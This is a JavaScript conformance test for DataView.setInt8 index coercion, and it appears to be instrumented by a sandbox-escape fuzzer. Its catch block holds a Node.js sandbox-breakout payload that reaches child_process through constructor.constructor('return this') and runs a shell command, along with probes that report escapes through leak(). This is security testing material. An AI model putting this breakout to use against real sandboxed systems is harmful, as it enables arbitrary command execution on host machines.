try {
    var buffer = new ArrayBuffer(12);
    var sample = new DataView(buffer, 0);
    var obj1 = {
        valueOf: function () {
            return 3;
        }
    };
    var obj2 = {
        toString: function () {
            return 4;
        }
    };
    sample.setInt8(0, 0);
    sample.setInt8(-0, 42);
    assert.sameValue(sample.getInt8(0), 42, '-0');
    sample.setInt8(3, 0);
    sample.setInt8(obj1, 42);
    assert.sameValue(sample.getInt8(3), 42, 'object\'s valueOf');
    sample.setInt8(4, 0);
    sample.setInt8(obj2, 42);
    assert.sameValue(sample.getInt8(4), 42, 'object\'s toString');
    sample.setInt8(0, 0);
    sample.setInt8('', 42);
    assert.sameValue(sample.getInt8(0), 42, 'the Empty string');
    sample.setInt8(0, 0);
    sample.setInt8('0', 42);
    assert.sameValue(sample.getInt8(0), 42, 'string \'0\'');
    sample.setInt8(2, 0);
    sample.setInt8('2', 42);
    assert.sameValue(sample.getInt8(2), 42, 'string \'2\'');
    sample.setInt8(1, 0);
    sample.setInt8(true, 42);
    assert.sameValue(sample.getInt8(1), 42, 'true');
    sample.setInt8(0, 0);
    sample.setInt8(false, 42);
    assert.sameValue(sample.getInt8(0), 42, 'false');
    sample.setInt8(0, 0);
    sample.setInt8(NaN, 42);
    assert.sameValue(sample.getInt8(0), 42, 'NaN');
    sample.setInt8(0, 0);
    sample.setInt8(null, 42);
    assert.sameValue(sample.getInt8(0), 42, 'null');
    sample.setInt8(0, 0);
    sample.setInt8(0.1, 42);
    assert.sameValue(sample.getInt8(0), 42, '0.1');
    sample.setInt8(0, 0);
    sample.setInt8(0.9, 42);
    assert.sameValue(sample.getInt8(0), 42, '0.9');
    sample.setInt8(1, 0);
    sample.setInt8(1.1, 42);
    assert.sameValue(sample.getInt8(1), 42, '1.1');
    sample.setInt8(1, 0);
    sample.setInt8(1.9, 42);
    assert.sameValue(sample.getInt8(1), 42, '1.9');
    sample.setInt8(0, 0);
    sample.setInt8(-0.1, 42);
    assert.sameValue(sample.getInt8(0), 42, '-0.1');
    sample.setInt8(0, 0);
    sample.setInt8(-0.99999, 42);
    assert.sameValue(sample.getInt8(0), 42, '-0.99999');
    sample.setInt8(0, 0);
    sample.setInt8(undefined, 42);
    assert.sameValue(sample.getInt8(0), 42, 'undefined');
    sample.setInt8(0, 7);
    sample.setInt8();
    assert.sameValue(sample.getInt8(0), 0, 'no arg');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}